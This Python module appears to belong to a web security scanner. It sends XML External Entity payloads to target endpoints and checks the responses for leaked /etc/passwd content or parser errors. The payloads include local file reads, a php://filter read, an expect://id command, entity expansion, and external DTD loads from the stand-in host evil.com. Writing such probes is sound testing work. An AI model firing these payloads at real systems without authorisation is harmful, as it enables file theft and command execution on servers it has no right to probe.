"""XXE active probe."""

from typing import Any

from src.analysis.helpers import classify_endpoint, endpoint_base_key, endpoint_signature
from src.analysis.passive.runtime import ResponseCache

from ._confidence import probe_confidence, probe_severity
from ._patterns import ETC_PASSWD_RE, XXE_ERROR_RE


def xxe_active_probe(
    priority_urls: list[dict[str, Any]],
    response_cache: ResponseCache,
    limit: int = 8,
) -> list[dict[str, Any]]:
    """Test endpoints that accept XML with XXE payloads.

    Sends XML bodies with DOCTYPE and ENTITY declarations to test for
    external entity expansion and file read via XXE. Checks responses
    for file content reflection and XML parsing errors.

    Args:
        priority_urls: List of URL dicts with endpoint metadata.
        response_cache: Response cache for making requests.
        limit: Maximum number of findings to return.

    Returns:
        List of XXE findings.
    """
    findings: list[dict[str, Any]] = []
    seen: set[str] = set()

    xxe_payloads = [
        (
            "xxe_file_read",
            '<?xml version="1.0"?>'
            "<!DOCTYPE root ["
            '<!ENTITY xxe SYSTEM "file:///etc/passwd">'
            "]><root>&xxe;</root>",
        ),
        (
            "xxe_entity_expansion",
            '<?xml version="1.0"?>'
            "<!DOCTYPE root ["
            '<!ENTITY x0 "ha!">'
            '<!ENTITY x1 "&x0;&x0;">'
            '<!ENTITY x2 "&x1;&x1;">'
            "]><root>&x2;</root>",
        ),
        (
            "xxe_external_dtd",
            '<?xml version="1.0"?>'
            '<!DOCTYPE root SYSTEM "http://evil.com/xxe.dtd">'
            "<root>test</root>",
        ),
        (
            "xxe_parameter_entity",
            '<?xml version="1.0"?>'
            "<!DOCTYPE root ["
            '<!ENTITY % dtd SYSTEM "http://evil.com/xxe.dtd">'
            "%dtd;"
            "]><root>test</root>",
        ),
        (
            "xxe_php_filter",
            '<?xml version="1.0"?>'
            "<!DOCTYPE root ["
            '<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">'
            "]><root>&xxe;</root>",
        ),
        (
            "xxe_expect",
            '<?xml version="1.0"?>'
            "<!DOCTYPE root ["
            '<!ENTITY xxe SYSTEM "expect://id">'
            "]><root>&xxe;</root>",
        ),
    ]

    for url_entry in priority_urls:
        if len(findings) >= limit:
            break
        url = str(url_entry.get("url", "") if isinstance(url_entry, dict) else url_entry).strip()
        if not url:
            continue

        endpoint_key = endpoint_signature(url)
        if endpoint_key in seen:
            continue
        seen.add(endpoint_key)

        if classify_endpoint(url) == "STATIC":
            continue

        url_issues: list[str] = []
        url_probes: list[dict[str, Any]] = []

        for payload_name, payload_body in xxe_payloads:
            if len(url_probes) >= 2:
                break

            response = response_cache.request(
                url,
                method="POST",
                headers={
                    "Cache-Control": "no-cache",
                    "Content-Type": "application/xml",
                    "X-XXE-Probe": "1",
                },
                body=payload_body,
            )
            if not response:
                continue

            body = str(response.get("body_text", "") or "")[:8000]
            status = int(response.get("status_code") or 0)

            issues_for_hit: list[str] = []

            if ETC_PASSWD_RE.search(body):
                issues_for_hit.append("xxe_file_read")
            elif XXE_ERROR_RE.search(body):
                issues_for_hit.append("xxe_error_reflection")
            elif "ha!ha!ha!ha!" in body:
                issues_for_hit.append("xxe_entity_expansion")
            elif status == 500 and len(body) > 50:
                issues_for_hit.append("xxe_error_reflection")

            if issues_for_hit:
                url_issues.extend(issues_for_hit)
                url_probes.append(
                    {
                        "payload_type": payload_name,
                        "status_code": status,
                        "issues": issues_for_hit,
                    }
                )

        if url_probes:
            findings.append(
                {
                    "url": url,
                    "endpoint_key": endpoint_key,
                    "endpoint_base_key": endpoint_base_key(url),
                    "endpoint_type": classify_endpoint(url),
                    "issues": url_issues,
                    "probes": url_probes,
                    "confidence": probe_confidence(url_issues),
                    "severity": probe_severity(url_issues),
                }
            )

    findings.sort(key=lambda item: (-item["confidence"], item["url"]))
    return findings[:limit]
